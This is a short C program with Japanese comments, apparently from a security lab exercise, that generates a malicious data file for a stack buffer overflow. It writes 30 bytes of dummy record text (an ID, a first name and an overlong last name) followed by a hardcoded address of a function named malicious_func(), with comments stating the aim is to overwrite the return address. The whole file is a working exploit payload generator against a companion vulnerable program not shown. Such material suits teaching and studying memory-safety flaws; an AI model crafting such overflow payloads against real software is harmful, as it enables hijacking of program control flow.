#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	FILE *fp;

	// ID と firstname と lastname（ダミーの値を適当に．lastname は 20 文字）
	char *str = "10 Chiemi ABCDEFGHIJKLMNOPQRST";
    // malicious_func() のアドレス
	int address = 0x00001e19;

	if (argc != 2) {
		fprintf(stderr, "Usage: gen_maldata <filename>\n");
		exit(EXIT_FAILURE);
	}


	if ((fp = fopen(argv[1], "wb")) == NULL) {
		perror(argv[1]);
		exit(EXIT_FAILURE);
	}

    // ダミー文字列を入れてから
	fwrite(str, sizeof(char), 30, fp);
    // リターンアドレスを上書きする
	fwrite(&address, sizeof(int), 1, fp);

	fclose(fp);
	return 0;
}
